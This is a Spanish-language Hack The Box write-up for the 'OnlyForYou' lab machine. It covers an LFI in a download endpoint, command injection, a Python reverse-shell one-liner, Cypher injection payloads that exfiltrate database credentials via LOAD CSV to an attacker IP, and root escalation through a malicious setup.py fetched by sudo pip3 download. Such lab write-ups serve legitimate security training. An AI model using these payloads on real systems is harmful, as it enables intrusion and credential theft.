---
title: Write-up OnlyForYou [Medium] - Hack The Box
date: 2023-04-28
categories: [Writeups, Hack The Box]
tags: [writeup, hackthebox, machines, medium, pentesting]
image: /assets/img/hackthebox/machines/onlyforyou/onlyforyou.png
image_link: false
---

Publicación del write-up de sujeto a las [guías generales](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines) de Hack The Box.

# Write-up OnlyForYou \[Medium\] - Hack The Box
\\
**Mi perfil de Hack The Box: [julianglez16](https://app.hackthebox.com/users/1084561)**

# Enumeración


### Puertos


![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled.png)


### Directorios web


![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(1).png)


### Virtual hosts


![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(2).png)



### Tecnologías web


![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(3).png)



### Funcionalidad web

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(4).png)
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(5).png)
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(6).png)
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(7).png)
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(8).png)



### Análisis con BurpSuite

Petición al suscribir un correo a la newsletter:
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(9).png)

# Explotación


### Usuario


Al descargar el código fuente desde `beta.only4you.htb` y descomprimirlo se puede ver un código fuente escrito en python.

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(10).png)



Analizando el código fuente se descubren varios endpoints nuevos para el dominio `beta.only4you.htb`:

- `/resize`

	![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(11).png)


- `/convert`

	![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(12).png)


- `/source`

	![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(13).png)


- `/list`

	![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(14).png)


- `/download`

	![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(15).png)



Al realizar la descarga de una imagen redimensionada, se realiza una petición _`POST`_ al servidor con la ruta del fichero en el cuerpo. La única “sanitización” que contiene la función `/download` en el código es comprobar si el fichero contiene `..` o empieza por `../` para intentar evitar ataques LFI. Al fijarse en el comportamiento del código para evitar LFI, se observa que en el segundo `if` comprueba si el nombre del fichero es un _path_ absoluto o no, y si **no** lo es, lo concatena con el _path_ del directorio de imágenes. 
Al inyectar un _path_ absoluto en el fichero de la petición, se realiza exitosamente el LFI.


![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(16).png)
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(17).png)


![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(18).png)



Al obtener el fichero `/etc/nginx/sites-available/default` se puede conocer el directorio raíz del servidor web. Con esta información se obtiene el código fuente de la aplicación web inicial para comprobar si existe alguna vulnerabilidad en dicha web.

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(19).png)


![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(20).png)


Código fuente de la aplicación web principa
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(21).png)


Obtención del fichero form.py:
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(22).png)



El fichero `form.py` contiene el método `issecure` que es vulnerable a Command Injection debido al uso de la función `run` de la librería `subprocess` de python.

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(23).png)



Aprovechando esta vulnerabilidad, se puede probar a ejecutar el comando `| telnet [IP] [PUERTO]` para comprobar la efectividad de la inyección.

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(24).png)



Respuesta del servidor gracias al command injection:
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(25).png)



Con esto se puede realizar un shell reverso que conecte a nuestra máquina con el payload 


```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")’
```

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(26).png)



Enumerando los puertos abiertos se encuentran algunos de interés dentro de la máquina


![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(27).png)



Para poder acceder a dichos servicios expuestos en la interfaz de [`localhost`](http://localhost/) se utiliza _Chisel_ con la siguiente configuración


![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(28).png)



Ejecución de Chisel en la máquina atacada:
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(29).png)



Ejecución de Chisel en la máquina de ataque (kali): 
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(30).png)



Con esta redirección, al conectarse a la IP `127.0.0.1:8001` en el buscador se llega a la siguiente web

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(31).png)


Realizando los mismos pasos para el puerto `3000` de la máquina `OnlyForYou` se llega a la siguiente web

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(32).png)


Realizando lo mismo para el puerto `7474` se llega a la siguiente web

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(33).png)



En el login de la página Only4You al usar las credenciales `admin:admin` se accede a un panel con diferentes gráficos y opciones.

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(34).png)


En las tareas se puede ver que utiliza la base de datos `neo4j`

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(35).png)



En el panel de empleados hay una barra de búsqueda. Desde esta se puede realizar una inyección llamada _Cypher Injection._

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(36).png)


Con el siguiente _payload:_ 


```bash
' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM '[http://IP:PUERTO/?version=](http://10.10.14.200:7777/?version=)' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(37).png)



Con el siguiente _payload_ se obtiene el nombre de las tablas existentes en la BD:


```bash
' OR 1=1 CALL db.labels() YIELD label LOAD CSV FROM "http://10.10.16.8:7777/?" + label as line RETURN 0 //
```

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(38).png)



Con el siguiente payload se obtienen los campos de la tabla `user`


```bash
' OR 1=1 WITH 1 as a MATCH (u:user) UNWIND keys(u) as p LOAD CSV FROM 'http://10.10.16.8:7777/?' + p + '=' + toString(u[p]) as l RETURN 0 as _0 //
```


Respuesta con las credenciales de los usuarios:
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(39).png)



Las contraseñas están cifradas con SHA256 por lo que hay que crackearlo


Comprobación del tipo de hash de la contraseña del usuario john:
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(40).png)


`admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918`

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(41).png)

`john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6`

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(42).png)


Con estas credenciales se puede hacer SSH a la máquina con el usuario `john`. Estas credenciales sirven también para hacer login en el repositorio de _Gogs_ que se descubrió en el puerto `3000`.


### Root


Una vez dentro de la máquina con el usuario `john`, se comprueba que tiene permisos de sudo para ejecutar `/usr/bin/pip3 download http://127.0.0.1:3000/*.tar.gz`. 


![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(43).png)


Con esta funcionalidad se puede ejecutar código con permisos de `root` debido a que `pip download` ejecuta el fichero `setup.py` que esté dentro del paquete [(https://medium.com/checkmarx-security/automatic-execution-of-code-upon-package-download-on-python-package-manager-cd6ed9e366a8)](https://medium.com/checkmarx-security/automatic-execution-of-code-upon-package-download-on-python-package-manager-cd6ed9e366a8).


Siguiendo este tutorial, se crea un paquete con un fichero `setup.py` malicioso que realice un shell reverso hacia nuestra máquina: [https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)


![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(44).png)

Con el comando `python3 setup.py sdist` se crea un fichero comprimido con el paquete que hemos creado.

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(45).png)


Este es el fichero que se sube al  repositorio para poder realizar la escalada de privilegios a través de `pip3 download`. Para poder obtener el paquete del repositorio es necesario hacerlo público a través de los ajustes del repositorio.

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(46).png)


Finalmente se realiza el _download_ con `pip3` y se obtiene la conexión con permisos de `root`.

![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(47).png)
![Untitled.png](/assets/img/hackthebox/machines/onlyforyou/Untitled%20(48).png)
